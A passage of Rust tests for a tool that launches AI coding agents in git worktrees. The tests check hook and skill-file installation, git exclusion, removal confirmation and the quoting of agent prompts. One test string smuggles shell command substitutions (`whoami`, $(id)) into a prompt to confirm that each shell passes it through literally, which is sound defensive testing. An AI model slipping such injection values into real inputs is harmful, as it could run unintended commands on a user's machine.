    async fn removal_asks_for_the_owners_own_untracked_hooks_file_after_ours_were_merged_in() {
        let (_dir, svc, ws) = a_workspace().await;
        std::fs::create_dir_all(codex_hooks(&ws).parent().unwrap()).unwrap();
        std::fs::write(codex_hooks(&ws), TEAM_CODEX).unwrap();

        svc.create_terminal(ws.id, "agent", "codex").await.expect("a codex pane");
        let merged = std::fs::read_to_string(codex_hooks(&ws)).unwrap();
        assert!(merged.contains("team-hook.sh") && merged.contains("--agent codex"), "{merged}");

        assert!(svc.removal_needs_confirmation(ws.id).await.expect("dirt check"), "their file would be lost");
    }

    /// "First launch" is not tracked, and this is what lets it not be.
    ///
    /// Every launch of a codex pane comes through the installer now. If a
    /// second one rewrote the file it would churn the mtime under every file
    /// watcher on the runner, and show the file as touched in a `git status`
    /// somebody is reading -- for no change at all. Skipping the write instead
    /// is what makes the flag, the column and the migration unnecessary.
    #[tokio::test]
    async fn launching_again_in_a_worktree_that_already_has_them_writes_nothing() {
        let (_dir, svc, ws) = a_workspace().await;
        svc.create_terminal(ws.id, "one", "codex").await.expect("a codex pane");
        let path = codex_hooks(&ws);

        // Dated rather than compared against `SystemTime::now`: mtime
        // granularity on some filesystems is a whole second, so a second write
        // milliseconds later can carry the same stamp as the first and a
        // "changed?" test would pass without meaning anything.
        let long_ago = std::time::SystemTime::UNIX_EPOCH + std::time::Duration::from_secs(1_000_000);
        let file = std::fs::File::options().write(true).open(&path).unwrap();
        file.set_times(std::fs::FileTimes::new().set_modified(long_ago)).unwrap();
        drop(file);

        svc.create_terminal(ws.id, "two", "codex").await.expect("a second codex pane");

        assert_eq!(
            std::fs::metadata(&path).unwrap().modified().unwrap(),
            long_ago,
            "the file already said this, so it was not written again"
        );
    }

    /// A fifth launch path, arriving without hooks.
    ///
    /// Every other test in this module drives one of the four paths that exist
    /// today, and every one of them would still be green on the day somebody
    /// adds a fifth and forgets. This is the one that would not. It reads this
    /// file's own production half and asks, of every method on `Service` that
    /// builds a pane's command, whether it prepared that pane's hooks first --
    /// so the guard covers the shape of the mistake rather than the four
    /// instances of it we happen to know about.
    ///
    /// Order matters and is checked: the file has to be on disk before the
    /// process that reads it starts.
    /// This file's production half: everything outside its `#[cfg(test)]`
    /// modules.
    ///
    /// Cutting at the FIRST `#[cfg(test)]`, which is what the guard below did
    /// until review caught it, was wrong the day it was written.
    /// `canonical_or_raw` is production code sitting BETWEEN two test modules,
    /// so a positional cut stopped hundreds of lines short of the end of the
    /// production code — and a fifth launch path written below that point
    /// would have been invisible to the guard while its coverage assert went
    /// on passing, because all four launch paths that exist today happen to
    /// live above the cut. A guard that cannot fail over the region it never
    /// reads is exactly the shape this file's tests keep being written to
    /// avoid, arriving inside one of them.
    ///
    /// So the test modules are removed by name rather than by position. Every
    /// one of them is `#[cfg(test)]` alone on a line at column zero followed by
    /// `mod x {`, and everything inside a module is indented — so the bare `}`
    /// that ends the skip is that module's own closing brace and nothing
    /// else's. `the_production_half_is_the_whole_of_the_production_code` checks
    /// that claim in both directions rather than trusting it.
    fn production_half() -> String {
        const SOURCE: &str = include_str!("service.rs");
        let mut kept = String::new();
        let mut lines = SOURCE.lines();
        while let Some(line) = lines.next() {
            if line == "#[cfg(test)]" {
                for inner in lines.by_ref() {
                    if inner == "}" {
                        break;
                    }
                }
                continue;
            }
            kept.push_str(line);
            kept.push('\n');
        }
        kept
    }

    /// The stripper really strips, and really keeps.
    ///
    /// Both directions matter and both fail loudly. Left short, the guard below
    /// reads less than the production code and cannot fail over the rest --
    /// which is the defect this replaced. Left long, it would walk
    /// `preset_tests`'s own functions, which build launch commands and have no
    /// worktree to install into, and go red on code that is not a launch path
    /// at all.
    #[test]
    fn the_production_half_is_the_whole_of_the_production_code() {
        let production = production_half();

        // The exact line that made a positional cut wrong: production code
        // living BELOW the first test module.
        assert!(
            production.contains("pub fn canonical_or_raw"),
            "production code below the first test module is missing from the scan"
        );
        for name in
            ["fn create_terminal", "fn split_terminal", "fn restart_terminal", "fn set_pane_mode"]
        {
            assert!(production.contains(name), "the scan cannot see `{name}`");
        }

        // And nothing from inside a test module survived -- including this
        // module, which is why `fn production_half` is one of the three.
        for test_only in ["mod restart_wiring_tests", "mod preset_tests", "fn production_half"] {
            assert!(!production.contains(test_only), "`{test_only}` is test code and was kept");
        }
    }

    #[test]
    fn every_launch_path_prepares_hooks_before_it_builds_a_command() {
        let production = production_half();

        /// The name of a method on `Service` -- four spaces of indent, inside
        /// the `impl` block -- or `None` for anything else.
        fn method(line: &str) -> Option<&str> {
            let rest = line.strip_prefix("    ")?;
            if rest.starts_with(' ') {
                return None;
            }
            let rest = rest.strip_prefix("pub(crate) ").unwrap_or(rest);
            let rest = rest.strip_prefix("pub ").unwrap_or(rest);
            let rest = rest.strip_prefix("async ").unwrap_or(rest);
            let rest = rest.strip_prefix("fn ")?;
            Some(rest.split(['(', '<']).next().unwrap_or(rest))
        }

        /// A free function or the end of the `impl`: whatever method we were
        /// inside of, we are not inside of it any more.
        fn leaves_the_impl(line: &str) -> bool {
            !line.starts_with(' ')
                && !line.is_empty()
                && (line.starts_with("fn ")
                    || line.starts_with("pub fn ")
                    || line.starts_with("async fn ")
                    || line.starts_with("pub async fn ")
                    || line.starts_with("impl ")
                    || line.starts_with('}'))
        }

        let mut inside: Option<&str> = None;
        let mut prepared = false;
        let mut covered: Vec<&str> = Vec::new();
        for line in production.lines() {
            if let Some(name) = method(line) {
                inside = Some(name);
                prepared = false;
                continue;
            }
            if leaves_the_impl(line) {
                inside = None;
                prepared = false;
                continue;
            }
            if line.contains("prepare_launch_hooks(") {
                prepared = true;
            }
            let builds_a_launch = line.contains("preset_command_with_hooks(")
                || line.contains("launch_command_with_prompt(")
                || line.contains("respawn_command(");
            if builds_a_launch && let Some(name) = inside {
                assert!(
                    prepared,
                    "`{name}` puts a program in a pane without calling \
                     `prepare_launch_hooks` first, so a codex or cursor pane launched \
                     through it reports nothing"
                );
                covered.push(name);
            }
        }

        // And the guard is still looking at the four it was written for: a
        // rename that put a launch path out of its sight would otherwise leave
        // it passing over an empty walk.
        // `create_terminal` and `split_terminal` are delegates now; the
        // launches they make are built in their `_with_prompt` halves.
        for expected in [
            "create_terminal_with_prompt",
            "split_terminal_with_prompt",
            "restart_terminal",
            "set_pane_mode",
        ] {
            assert!(covered.contains(&expected), "{expected} was not walked at all: {covered:?}");
        }
    }

    /// The first message goes to the first launch and to no other.
    ///
    /// Structural, because the other half of it cannot be run here: a test
    /// that restarted a real agent pane would start a real agent. What keeps
    /// a restart from sending the task again is that only two methods ever
    /// build a launch with a prompt — the two first launches — and every
    /// other path gets its extras from `prepare_launch_hooks`, which sets
    /// none. This reads the production code and says so.
    #[test]
    fn only_a_first_launch_is_built_with_a_prompt() {
        let production = production_half();
        let mut inside: Option<String> = None;
        let mut builders: Vec<String> = Vec::new();
        let mut setters: Vec<String> = Vec::new();
        for line in production.lines() {
            let trimmed = line.trim_start();
            let indent = line.len() - trimmed.len();
            if indent <= 4 {
                let rest = trimmed.strip_prefix("pub(crate) ").unwrap_or(trimmed);
                let rest = rest.strip_prefix("pub ").unwrap_or(rest);
                let rest = rest.strip_prefix("async ").unwrap_or(rest);
                if let Some(rest) = rest.strip_prefix("fn ") {
                    inside = rest.split(['(', '<']).next().map(str::to_string);
                }
            }
            let Some(name) = inside.clone() else { continue };
            if line.contains("launch_command_with_prompt(") && !line.contains("fn launch_command_with_prompt") {
                builders.push(name.clone());
            }
            if line.contains("LaunchPrompt::Inline(") || line.contains("LaunchPrompt::File(") {
                setters.push(name);
            }
        }
        builders.sort();
        builders.dedup();
        setters.sort();
        setters.dedup();
        assert_eq!(builders, ["create_terminal_with_prompt", "split_terminal_with_prompt"]);
        // Constructed in the one function that decides inline or file, and
        // read in the one that renders it — nowhere else.
        assert_eq!(setters, ["launch_command_with_prompt", "prompt_argument"]);
        // And the extras every launch path starts from carry none.
        assert!(production.contains("LaunchExtras { settings, plugin_dir, trust_workspace, prompt: None }"));
    }
}

/// The manager skill in a worktree: written on the same two acts as the hooks
/// files (making a worktree, and opening a codex or cursor pane in one), and
/// hidden from `git::is_dirty` and the diff view the same way.
#[cfg(test)]
mod project_skill_tests {
    use super::*;
    use crate::skill_install::{PROJECT_SKILL, PROJECT_SKILL_POLICY};

    use super::restart_wiring_tests::a_workspace;

    fn skill(ws: &models::Workspace) -> PathBuf {
        Path::new(&ws.worktree_path).join(PROJECT_SKILL)
    }

    fn policy(ws: &models::Workspace) -> PathBuf {
        Path::new(&ws.worktree_path).join(PROJECT_SKILL_POLICY)
    }

    fn git_in(dir: &Path, args: &[&str]) {
        let out = std::process::Command::new("git")
            .arg("-C")
            .arg(dir)
            .args(["-c", "user.name=t", "-c", "user.email=t@example.invalid", "-c", "commit.gpgsign=false"])
            .args(args)
            .output()
            .expect("git runs");
        assert!(out.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&out.stderr));
    }

    /// A worktree Far Cooler made, with a codex pane opened in it: the only
    /// way the skill gets there.
    async fn a_codex_worktree(svc: &Service, repo: Uuid, name: &str) -> models::Workspace {
        let ws = svc
            .create_workspace(repo, name, &format!("feat/{name}"), "HEAD")
            .await
            .expect("a workspace");
        svc.create_terminal(ws.id, "agent", "codex").await.expect("a codex pane");
        ws
    }

    /// The paths `git diff --cached` would commit.
    fn staged(dir: &Path) -> String {
        let out = std::process::Command::new("git")
            .arg("-C")
            .arg(dir)
            .args(["diff", "--cached", "--name-only"])
            .output()
            .expect("git diff");
        String::from_utf8_lossy(&out.stdout).into_owned()
    }

    /// Making a worktree writes no skill into it: codex's copy comes with
    /// codex, and a worktree only claude or cursor ever runs in holds nothing
    /// none of them reads.
    #[tokio::test]
    async fn a_new_worktree_holds_no_skill_until_codex_opens_there() {
        let (_dir, svc, repo) = crate::test_support::fixture().await;
        let ws = svc
            .create_workspace(repo, "skill", "feat/skill", "HEAD")
            .await
            .expect("a workspace");
        assert!(!Path::new(&ws.worktree_path).join(".agents").exists(), "creating it wrote the skill");

        svc.create_terminal(ws.id, "agent", "cursor").await.expect("a cursor pane");
        svc.create_terminal(ws.id, "agent", "claude").await.expect("a claude pane");
        assert!(!Path::new(&ws.worktree_path).join(".agents").exists(), "and neither did cursor or claude");

        svc.create_terminal(ws.id, "agent", "codex").await.expect("a codex pane");
        assert!(skill(&ws).exists() && policy(&ws).exists(), "codex gets it");
    }

    /// The copy is untracked, and an agent's `git add -A` must not commit it:
    /// the repository's `info/exclude`, in the common directory a linked
    /// worktree shares, names both files. Read back from what git stages.
    #[tokio::test]
    async fn git_add_all_in_a_codex_worktree_stages_no_skill() {
        let (dir, svc, repo) = crate::test_support::fixture().await;
        let ws = a_codex_worktree(&svc, repo, "skill").await;
        let worktree = Path::new(&ws.worktree_path);
        assert!(skill(&ws).exists(), "the skill was written");
        std::fs::write(worktree.join("theirs.txt"), "real work").unwrap();

        git_in(worktree, &["add", "-A"]);

        let staged = staged(worktree);
        assert!(staged.contains("theirs.txt"), "git add -A ran: {staged}");
        assert!(!staged.contains(".agents"), "the skill was staged: {staged}");
        let exclude = std::fs::read_to_string(dir.path().join("repo/.git/info/exclude")).expect("info/exclude");
        assert!(exclude.lines().any(|l| l == format!("/{PROJECT_SKILL}")), "{exclude}");
        assert!(exclude.lines().any(|l| l == format!("/{PROJECT_SKILL_POLICY}")), "{exclude}");
        assert!(
            !worktree.join(".gitignore").exists(),
            "the repository's own .gitignore is never touched"
        );
    }

    /// Writing the skill again adds no second line, and the owner's own lines
    /// in the file are kept as they were.
    #[tokio::test]
    async fn excluding_again_adds_no_second_line() {
        let (dir, svc, repo) = crate::test_support::fixture().await;
        let exclude = dir.path().join("repo/.git/info/exclude");
        std::fs::create_dir_all(exclude.parent().unwrap()).unwrap();
        std::fs::write(&exclude, "# mine\n*.log").unwrap();
        let ws = a_codex_worktree(&svc, repo, "skill").await;
        std::fs::remove_file(skill(&ws)).expect("take the skill away");
        svc.create_terminal(ws.id, "again", "codex").await.expect("another codex pane");
        assert!(skill(&ws).exists(), "the skill was written again");

        let text = std::fs::read_to_string(&exclude).unwrap();
        assert!(text.starts_with("# mine\n*.log\n"), "the owner's lines are kept: {text}");
        let ours = format!("/{PROJECT_SKILL}");
        assert_eq!(text.lines().filter(|l| *l == ours).count(), 1, "{text}");
        let whose = text.lines().filter(|l| l.starts_with("# Far Cooler")).count();
        assert_eq!(whose, 1, "one comment for both of our lines: {text}");
    }

    /// An unedited copy of ours is not work: removing a worktree that holds
    /// only that asks for nothing, and neither the dirt check nor the diff
    /// view shows it.
    #[tokio::test]
    async fn an_unedited_copy_of_ours_needs_no_confirmation_to_remove() {
        let (_dir, svc, repo) = crate::test_support::fixture().await;
        let ws = a_codex_worktree(&svc, repo, "skill").await;

        // An absence of dirt, not an absence of files: both are there.
        let text = std::fs::read_to_string(skill(&ws)).expect("the skill was written");
        assert!(text.contains("**Never execute a task yourself.**"), "{text}");
        assert!(policy(&ws).exists(), "and codex's policy beside it");

        let worktree = Path::new(&ws.worktree_path);
        assert!(!git::is_dirty(worktree).await.expect("dirt check"), "Far Cooler's own files are not work");
        let tree = crate::change_set::working_tree(worktree).await.expect("the diff view");
        assert!(!format!("{tree:?}").contains(".agents"), "and the diff view doesn't show them: {tree:?}");
        assert!(!svc.removal_needs_confirmation(ws.id).await.expect("dirt check"));
    }

    /// The owner's own file in `.agents/` still shows as their work. The
    /// exclude lines name our two files, never the directory.
    #[tokio::test]
    async fn a_file_of_the_users_beside_our_skill_is_still_reported() {
        let (_dir, svc, repo) = crate::test_support::fixture().await;
        let ws = a_codex_worktree(&svc, repo, "skill").await;
        let worktree = Path::new(&ws.worktree_path);
        std::fs::write(skill(&ws).with_file_name("notes.md"), "mine").unwrap();

        assert!(git::is_dirty(worktree).await.expect("dirt check"), "their file is uncommitted work");
        let tree = crate::change_set::working_tree(worktree).await.expect("the diff view");
        assert!(format!("{tree:?}").contains("notes.md"), "and the diff view shows it: {tree:?}");
    }

    /// The owner edited our copy. Git ignores it, so nothing reports it as
    /// dirty, and removing the worktree would lose the edit: it must ask.
    #[tokio::test]
    async fn an_edited_copy_asks_before_the_worktree_is_removed() {
        let (_dir, svc, repo) = crate::test_support::fixture().await;
        let ws = a_codex_worktree(&svc, repo, "skill").await;
        let edited = format!("{}my own rule\n", std::fs::read_to_string(skill(&ws)).unwrap());
        std::fs::write(skill(&ws), edited).unwrap();

        assert!(
            !git::is_dirty(Path::new(&ws.worktree_path)).await.expect("dirt check"),
            "git ignores it, which is the case this test is about"
        );
        assert!(svc.removal_needs_confirmation(ws.id).await.expect("dirt check"), "the edit would be lost");
    }

    /// `info/exclude` is shared by every worktree of a repository, so a file
    /// of the owner's own at our path in ANOTHER worktree is ignored too, and
    /// is theirs to lose.
    #[tokio::test]
    async fn a_file_we_never_wrote_at_our_path_asks_before_removal() {
        let (_dir, svc, repo) = crate::test_support::fixture().await;
        let _codex = a_codex_worktree(&svc, repo, "skill").await;
        let other = svc
            .create_workspace(repo, "other", "feat/other", "HEAD")
            .await
            .expect("a workspace");
        std::fs::create_dir_all(skill(&other).parent().unwrap()).unwrap();
        std::fs::write(skill(&other), "---\nname: farcooler-manager\n---\ntheirs\n").unwrap();

        assert!(!git::is_dirty(Path::new(&other.worktree_path)).await.expect("dirt check"), "git ignores it");
        assert!(svc.removal_needs_confirmation(other.id).await.expect("dirt check"), "it isn't ours");
    }

    /// A copy the repository tracks is the owner's committed file, and a
    /// change to it is dirty like a change to any other: nothing hides it.
    #[tokio::test]
    async fn a_tracked_copy_the_owner_changed_is_dirty() {
        let (_dir, svc, repo) = crate::test_support::fixture().await;
        let ws = svc
            .create_workspace(repo, "skill", "feat/skill", "HEAD")
            .await
            .expect("a workspace");
        let worktree = Path::new(&ws.worktree_path);
        std::fs::create_dir_all(skill(&ws).parent().unwrap()).unwrap();
        std::fs::write(skill(&ws), crate::skill_install::sign_markdown("committed\n")).unwrap();
        git_in(worktree, &["add", "-f", PROJECT_SKILL]);
        git_in(worktree, &["commit", "-q", "-m", "a skill somebody committed"]);
        assert!(!git::is_dirty(worktree).await.expect("dirt check"), "committed and unchanged");

        std::fs::write(skill(&ws), "changed\n").unwrap();

        assert!(git::is_dirty(worktree).await.expect("dirt check"), "a changed tracked file is work");
        let tree = crate::change_set::working_tree(worktree).await.expect("the diff view");
        assert!(format!("{tree:?}").contains(PROJECT_SKILL), "and the diff view shows it: {tree:?}");
        assert!(svc.removal_needs_confirmation(ws.id).await.expect("dirt check"));
    }

    /// A committed file at our path that nobody changed is safe in the
    /// branch, so it asks for nothing, even though it isn't ours.
    #[tokio::test]
    async fn a_committed_skill_nobody_changed_needs_no_confirmation() {
        let (_dir, svc, repo) = crate::test_support::fixture().await;
        let ws = svc
            .create_workspace(repo, "skill", "feat/skill", "HEAD")
            .await
            .expect("a workspace");
        let worktree = Path::new(&ws.worktree_path);
        std::fs::create_dir_all(skill(&ws).parent().unwrap()).unwrap();
        std::fs::write(skill(&ws), "theirs, committed\n").unwrap();
        git_in(worktree, &["add", "-f", PROJECT_SKILL]);
        git_in(worktree, &["commit", "-q", "-m", "a skill of their own"]);

        assert!(!svc.removal_needs_confirmation(ws.id).await.expect("dirt check"));
    }

    /// A `.agents` that links to a shared skills directory is outside the
    /// worktree, and nothing is written through it.
    #[tokio::test]
    async fn a_linked_agents_directory_is_not_written_through() {
        let (_dir, svc, ws) = a_workspace().await;
        let shared = tempfile::tempdir().unwrap();
        std::os::unix::fs::symlink(shared.path(), Path::new(&ws.worktree_path).join(".agents")).unwrap();

        svc.create_terminal(ws.id, "agent", "codex").await.expect("a codex pane");

        let wrote: Vec<_> = walk(shared.path());
        assert!(wrote.is_empty(), "wrote through the link: {wrote:?}");
    }

    /// Every file under `dir`.
    fn walk(dir: &Path) -> Vec<PathBuf> {
        let mut found = Vec::new();
        for entry in std::fs::read_dir(dir).into_iter().flatten().flatten() {
            let path = entry.path();
            if path.is_dir() {
                found.extend(walk(&path));
            } else {
                found.push(path);
            }
        }
        found
    }

    /// A git that runs and can't answer — here, a directory that isn't a
    /// repository — is "can't tell", and "can't tell" means don't write.
    #[tokio::test]
    async fn a_git_that_cannot_answer_counts_as_tracked() {
        let dir = tempfile::tempdir().unwrap();
        assert!(git_tracks_without_blocking(dir.path(), PROJECT_SKILL).await, "exit 128 read as untracked");
    }

    /// And the other side of it: a repository that doesn't know the path
    /// exits 1, which is the one answer that means untracked.
    #[tokio::test]
    async fn a_path_git_does_not_know_is_untracked() {
        let dir = tempfile::tempdir().unwrap();
        git_in(dir.path(), &["init", "-q"]);
        assert!(!git_tracks_without_blocking(dir.path(), PROJECT_SKILL).await);
    }

    /// Opening codex in a checkout Far Cooler didn't make writes the skill
    /// there, the act the ruling allows. Read back from disk.
    #[tokio::test]
    async fn opening_codex_puts_the_skill_in_that_worktree() {
        let (_dir, svc, ws) = a_workspace().await;
        assert!(!skill(&ws).exists(), "the reconciler adopts without writing");

        svc.create_terminal(ws.id, "agent", "codex:gpt-5.6-sol").await.expect("a codex pane");

        let text = std::fs::read_to_string(skill(&ws)).expect("the skill, in this worktree");
        assert!(text.starts_with("---\nname: farcooler-manager\n"), "{text}");
        let cli = shell_quote(&shim_binary(std::env::current_exe().ok().as_deref()));
        assert!(text.contains(&format!("{cli} task list")), "naming this runner's CLI: {text}");
        let yaml = std::fs::read_to_string(policy(&ws)).expect("codex's policy");
        assert!(yaml.contains("allow_implicit_invocation: false"), "{yaml}");
    }

    /// The directory a pane's program was handed as `--plugin-dir`, read out
    /// of the command tmux was actually given.
    async fn plugin_dir_of(svc: &Service, terminal: Uuid, program: &str) -> PathBuf {
        let command = super::restart_wiring_tests::pane_start_command(svc, terminal).await;
        // tmux prints a start command inside double quotes, with a backslash
        // before each backslash, double quote and dollar sign in it.
        let quoted = command.strip_prefix('"').and_then(|c| c.strip_suffix('"')).unwrap_or(&command);
        let (mut unquoted, mut chars) = (String::new(), quoted.chars());
        while let Some(c) = chars.next() {
            unquoted.push(if c == '\\' { chars.next().unwrap_or(c) } else { c });
        }
        let shell = format!("{} -ilc", farcooler_core::shell::login_shell());
        let from_shell = unquoted.find(&shell).map_or(unquoted.as_str(), |at| &unquoted[at..]);
        let argv = super::preset_tests::argv_through_both_shells(from_shell, program);
        let dir = argv
            .split(',')
            .skip_while(|a| *a != "--plugin-dir")
            .nth(1)
            .unwrap_or_else(|| panic!("launched with no --plugin-dir: {command} -> {argv}"));
        PathBuf::from(dir)
    }

    /// The owner's ruling: cursor takes the skill from `--plugin-dir`, like
    /// claude, so opening cursor writes nothing into the repository. Read
    /// back from the filesystem, not from what any function returned.
    #[tokio::test]
    async fn opening_cursor_writes_nothing_into_the_worktree() {
        let (_dir, svc, ws) = a_workspace().await;
        let status = || {
            let out = std::process::Command::new("git")
                .arg("-C")
                .arg(&ws.worktree_path)
                .args(["status", "--porcelain", "--untracked-files=all", "--ignored"])
                .output()
                .expect("git status");
            String::from_utf8_lossy(&out.stdout)
                .lines()
                // cursor's HOOKS file is the one write a cursor launch makes,
                // under the hooks ruling; this test is about the skill.
                .filter(|l| !l.contains(crate::hook_install::CURSOR_HOOKS))
                .map(str::to_string)
                .collect::<Vec<_>>()
        };
        let before = status();

        svc.create_terminal(ws.id, "agent", "cursor").await.expect("a cursor pane");

        assert!(!Path::new(&ws.worktree_path).join(".agents").exists(), "no skill in the worktree");
        assert_eq!(status(), before, "opening cursor wrote something into the worktree");
    }

    /// And the flag points at the skill: parsed out of the command tmux was
    /// handed, and read back from where it points.
    #[tokio::test]
    async fn opening_a_cursor_pane_puts_the_skill_where_the_flag_points() {
        let (_dir, svc, ws) = a_workspace().await;
        let term = svc.create_terminal(ws.id, "agent", "cursor:auto").await.expect("a cursor pane");

        let dir = plugin_dir_of(&svc, term.id, "cursor-agent").await;
        let text = std::fs::read_to_string(dir.join("skills/manager/SKILL.md"))
            .unwrap_or_else(|e| panic!("no skill where --plugin-dir points ({}): {e}", dir.display()));
        assert!(text.contains("**Never execute a task yourself.**"), "{text}");
        let manifest = std::fs::read_to_string(dir.join(".cursor-plugin/plugin.json")).expect("cursor's manifest");
        assert!(manifest.contains("\"farcooler\""), "{manifest}");
    }

    /// A restarted cursor pane is launched again, and keeps the flag.
    #[tokio::test]
    async fn a_restarted_cursor_pane_keeps_the_plugin_dir() {
        let (_dir, svc, ws) = a_workspace().await;
        let term = svc.create_terminal(ws.id, "agent", "cursor").await.expect("a cursor pane");
        std::fs::remove_dir_all(svc.root.join(crate::skill_install::PLUGIN_DIR)).expect("take it away");

        svc.restart_terminal(term.id).await.expect("restart");

        let dir = plugin_dir_of(&svc, term.id, "cursor-agent").await;
        assert!(dir.join("skills/manager/SKILL.md").exists(), "the restart wrote it again");
        assert!(!Path::new(&ws.worktree_path).join(".agents").exists());
    }

    /// A restart is a launch, the same as for the hooks: a worktree cleaned
    /// out between the two gets the skill back.
    #[tokio::test]
    async fn a_restarted_codex_pane_puts_the_skill_back() {
        let (_dir, svc, ws) = a_workspace().await;
        let term = svc.create_terminal(ws.id, "agent", "codex").await.expect("a codex pane");
        std::fs::remove_file(skill(&ws)).expect("take the skill away");

        svc.restart_terminal(term.id).await.expect("restart");

        assert!(skill(&ws).exists(), "a restarted pane gets the skill again");
    }

    /// And opening a shell or claude there writes nothing into the
    /// repository: claude's copy lives in the runtime directory.
    #[tokio::test]
    async fn opening_claude_or_a_shell_writes_no_skill_into_the_repository() {
        let (_dir, svc, ws) = a_workspace().await;

        svc.create_terminal(ws.id, "agent", "claude").await.expect("a claude pane");
        svc.create_terminal(ws.id, "plain", "shell").await.expect("a shell pane");

        assert!(!Path::new(&ws.worktree_path).join(".agents").exists());
        assert!(svc.root.join(crate::skill_install::PLUGIN_DIR).exists(), "the plugin claude is handed");
    }

    /// A user's own skill survives, and so does an edited copy of ours: the
    /// ownership rule, reached through the real call site.
    #[tokio::test]
    async fn a_worktree_that_already_has_skills_keeps_them() {
        let (_dir, svc, ws) = a_workspace().await;
        let theirs = Path::new(&ws.worktree_path).join(".agents/skills/other/SKILL.md");
        std::fs::create_dir_all(theirs.parent().unwrap()).unwrap();
        std::fs::write(&theirs, "theirs\n").unwrap();
        let edited = crate::skill_install::sign_markdown("an older copy\n").replace("older", "edited");
        std::fs::create_dir_all(skill(&ws).parent().unwrap()).unwrap();
        std::fs::write(skill(&ws), &edited).unwrap();

        svc.create_terminal(ws.id, "agent", "codex").await.expect("a codex pane");

        assert_eq!(std::fs::read_to_string(&theirs).unwrap(), "theirs\n");
        assert_eq!(std::fs::read_to_string(skill(&ws)).unwrap(), edited, "an edited copy is theirs now");
        // The installer did run here, and chose: the policy beside it is new.
        assert!(policy(&ws).exists(), "the launch never reached the installer");
    }

    /// A repository that TRACKS the file gets nothing written into it. A
    /// committed copy is somebody's decision, and a write there would put a
    /// change in their diff they never made. The tracked copy here is an unedited one of ours, so the
    /// ownership rule alone would replace it: only the tracked check stops it.
    #[tokio::test]
    async fn a_skill_file_git_tracks_is_never_written() {
        let (_dir, svc, ws) = a_workspace().await;
        let worktree = Path::new(&ws.worktree_path);
        let committed = crate::skill_install::sign_markdown("an older copy, committed\n");
        std::fs::create_dir_all(skill(&ws).parent().unwrap()).unwrap();
        std::fs::write(skill(&ws), &committed).unwrap();
        git_in(worktree, &["add", "-f", PROJECT_SKILL]);
        git_in(worktree, &["commit", "-q", "-m", "a skill somebody committed"]);

        svc.create_terminal(ws.id, "agent", "codex").await.expect("a codex pane");

        assert_eq!(std::fs::read_to_string(skill(&ws)).unwrap(), committed, "a tracked file is left alone");
        // The untracked policy beside it is still ours to write.
        assert!(policy(&ws).exists());
    }
}

/// The agent's first message as its launch argument: how it is quoted, when it
/// goes through a file, and which launches carry it.
#[cfg(test)]
mod launch_prompt_tests {
    use super::*;

    /// Everything a person might type that a shell would like to interpret:
    /// both quotes, a variable, a command substitution in both spellings,
    /// backslashes (one before a quote, two together), a newline, a `!`, and
    /// text outside ASCII.
    const AWKWARD: &str = "Fix it's \"flaky\" $HOME test: run `whoami` and $(id)\\\nthen \\' and \\\\ — naïve 日本語 ✓ !$";

    /// Every shell on this machine that a pane's command could be parsed by.
    /// fish is here on purpose: it is the login shell of the person this was
    /// built for, and its single quotes are not inert (see `shell_quote`).
    fn shells() -> Vec<String> {
        let mut found: Vec<String> = ["/bin/sh", "/bin/bash", "/bin/zsh"]
            .iter()
            .filter(|p| Path::new(p).exists())
            .map(|p| p.to_string())
            .collect();
        match farcooler_core::programs::find("fish") {
            Some(fish) => found.push(fish.display().to_string()),
            // CI installs fish (ci.yml, "Install fish") so this half runs
            // where it counts; a CI run without it is a broken runner, not a
            // reason to pass without the one shell that differs.
            None if std::env::var_os("CI").is_some() => {
                panic!("fish is not installed, and CI must run the fish half of this test")
            }
            None => eprintln!("fish is not installed here; the fish half of this test did not run"),
        }
        found
    }

    /// Run `command` the way a pane does — an outer shell handed the whole
    /// string, the login shell handed the `-ilc` payload — with `outer` and
    /// `inner` standing in for them and `program` swapped for a `printf`
    /// that joins its arguments with commas. What comes back is the argv the
    /// agent would have seen.
    fn argv_through(command: &str, program: &str, outer: &str, inner: &str) -> String {
        let prefix = format!("{} -ilc", farcooler_core::shell::login_shell());
        let probe = crate::service::test_agent::unstubbed(command)
            .replacen(&prefix, &format!("{inner} -c"), 1)
            .replacen(program, "printf ,%s", 1);
        assert!(probe.contains(&format!("{inner} -c")), "the prefix was found: {probe}");
        let out = std::process::Command::new(outer)
            .arg("-c")
            .arg(&probe)
            .output()
            .expect("run the probe");
        String::from_utf8_lossy(&out.stdout).into_owned()
    }

    fn inline(text: &str) -> LaunchExtras {
        LaunchExtras { prompt: Some(LaunchPrompt::Inline(text.to_string())), ..LaunchExtras::NONE }
    }

    #[test]
    fn a_prompt_reaches_each_agent_as_one_exact_argument_under_every_shell() {
        let cases = [
            ("claude", "claude", String::new()),
            ("codex", "codex", ",-c,check_for_update_on_startup=false".to_string()),
            ("cursor", "cursor-agent", String::new()),
        ];
        let shells = shells();
        for (preset, program, flags) in &cases {
            let command = preset_command_with_hooks(preset, None, &inline(AWKWARD));
            for outer in &shells {
                for inner in &shells {
                    assert_eq!(
                        argv_through(&command, program, outer, inner),
                        format!("{flags},{AWKWARD}"),
                        "{preset} under {outer} then {inner}: {command}"
                    );
                }
            }
        }
    }

    /// A pane opened for a task starts on `opening_prompt`, through the same
    /// first-launch path as any prompt: one exact argument for each agent,
    /// under every shell, CLI path quotes and all. The CLI path is the
    /// awkward part: an app bundle's path has a space in it.
    #[test]
    fn the_opening_prompt_arrives_as_one_argument() {
        let dir = tempfile::tempdir().unwrap();
        let cli = shell_quote("/Applications/Far Cooler.app/Contents/MacOS/farcooler");
        let opening = opening_prompt(&cli, "fc-1");
        let cases = [
            ("claude", "claude", String::new()),
            ("codex", "codex", ",-c,check_for_update_on_startup=false".to_string()),
            ("cursor", "cursor-agent", String::new()),
        ];
        let shells = shells();
        for (preset, program, flags) in &cases {
            let command = launch_command_with_prompt(
                dir.path(), Uuid::now_v7(), preset, None, LaunchExtras::NONE, Some(&opening), Some("fc-1"));
            assert!(command.starts_with("env "), "{command}");
            assert!(command.contains(" FARCOOLER_TASK=fc-1 "), "{command}");
            for outer in &shells {
                for inner in &shells {
                    assert_eq!(
                        argv_through(&command, program, outer, inner),
                        format!("{flags},{opening}"),
                        "{preset} under {outer} then {inner}: {command}"
                    );
                }
            }
        }
    }

    /// A prefixless key (`-1`) would parse as a flag, so the commands in the
    /// opening prompt leave it out and rely on the pane's `FARCOOLER_TASK`.
    #[test]
    fn a_prefixless_key_is_not_written_where_it_would_read_as_a_flag() {
        let opening = opening_prompt("farcooler", "-1");
        assert!(opening.contains("You're working -1"), "{opening}");
        assert!(!opening.contains("task show -1"), "{opening}");
